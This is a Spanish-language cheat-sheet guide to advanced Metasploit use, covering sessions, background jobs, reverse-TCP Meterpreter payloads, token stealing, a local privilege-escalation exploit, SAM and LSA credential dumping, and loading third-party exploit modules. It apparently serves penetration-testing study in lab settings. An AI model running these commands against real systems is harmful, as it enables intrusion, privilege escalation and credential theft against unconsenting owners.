---
title: "Metasploit Framework Avanzado: Jobs, Sesiones y Meterpreter"
pubDate: '2026-08-26'
---

Guía técnica del manejo profesional de Metasploit Framework: gestión de tareas en segundo plano (Jobs), sesiones interactivas, post-explotación con Meterpreter, robo de tokens, volcado de credenciales y carga de módulos externos.

---

## ⚙️ 1. Estructura y Comandos Esenciales

### Ubicación del Framework y Plugins
* **Directorio base:** `/usr/share/metasploit-framework/`
* **Directorio de plugins:** `/usr/share/metasploit-framework/plugins/` (soporta extensiones como `sqlmap.rb`, `nessus.rb`, `wmap.rb`).

### Estructura de Nombres de Módulos
`<tipo>/<sistema_operativo>/<servicio_o_protocolo>/<nombre_exploit>`  
*(Ejemplo: `exploit/windows/ftp/scriptftp_list`)*

### Comandos de Navegación y Variables Globales:
```bash
# Información detallada de un módulo
info

# Asignar una variable global persistente durante toda la sesión de msfconsole
setg RHOSTS 10.129.201.248
setg LHOST 10.10.14.5

# Listar targets y payloads compatibles con el exploit cargado
show targets
show payloads
set payload windows/x64/meterpreter/reverse_tcp
```

---

## 🔄 2. Manejo de Sesiones y Trabajos (Jobs)

### Gestión de Sesiones Activas
* `Ctrl + Z` / `background`: Pone la sesión actual de Meterpreter/Shell en segundo plano.
```bash
# Listar todas las sesiones activas
sessions -l

# Interactuar con una sesión específica
sessions -i 1

# Matar una sesión
sessions -k 1
```

### Gestión de Trabajos en Segundo Plano (Jobs)
Un **Job** es una tarea o proceso que se ejecuta en tu propia consola de Metasploit (un listener o un exploit en segundo plano):
```bash
# Lanzar un exploit o handler en segundo plano como Job
exploit -j
run -j

# Listar trabajos activos
jobs -l

# Ver información detallada del trabajo
jobs -i 0 -v

# Terminar un trabajo específico / todos los trabajos
jobs -k 0
jobs -K
```

---

## 🕵️ 3. Post-Explotación con Meterpreter

### Robo de Tokens y Migración de Procesos
Si el proceso comprometido no dispone de suficientes privilegios, puedes robar el token de un proceso ejecutado por una cuenta superior (ej. `NT AUTHORITY\SYSTEM`):
```text
# 1. Comprobar identidad actual
meterpreter > getuid

# 2. Listar procesos y localizar un PID con mayores privilegios
meterpreter > ps

# 3. Robar token de identidad del proceso objetivo
meterpreter > steal_token <PID>

# 4. Verificar nueva identidad
meterpreter > getuid
```

### Búsqueda Automatizada de Vulnerabilidades Locales
```bash
# Poner sesión en segundo plano (Ctrl+Z)
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Lanzar el exploit recomendado directamente contra la sesión
use exploit/windows/local/ms15_051_client_copy_images
set SESSION 1
run
```

### Volcado de Hashes y Secretos LSA
```text
# Volcado de la base de datos SAM local
meterpreter > hashdump

# Volcado avanzado de SAM mediante LSA
meterpreter > lsa_dump_sam

# Volcado de secretos LSA (contraseñas en texto claro de servicios y cuentas de máquina)
meterpreter > lsa_dump_secrets
```

---

## 🛠️ 4. Importación de Módulos Externos y VirusTotal

### Cargar Exploits Personalizados de Terceros
Si descargas un archivo `.rb` de GitHub o Exploit-DB que no esté en la base de Metasploit:
```bash
# 1. Crear directorio en tu carpeta personal de msf4
mkdir -p $HOME/.msf4/modules/exploits/custom

# 2. Copiar el exploit .rb a dicha carpeta (ej. exploit_nuevo.rb)
cp exploit_nuevo.rb $HOME/.msf4/modules/exploits/custom/

# 3. En msfconsole, recargar todos los módulos
msf6 > reload_all

# 4. Usar el módulo importado (sin la extensión .rb)
msf6 > use exploit/custom/exploit_nuevo
```

### Verificación de Detección con `msf-virustotal`
```bash
msf-virustotal -k <API_KEY> -f payload.exe
```
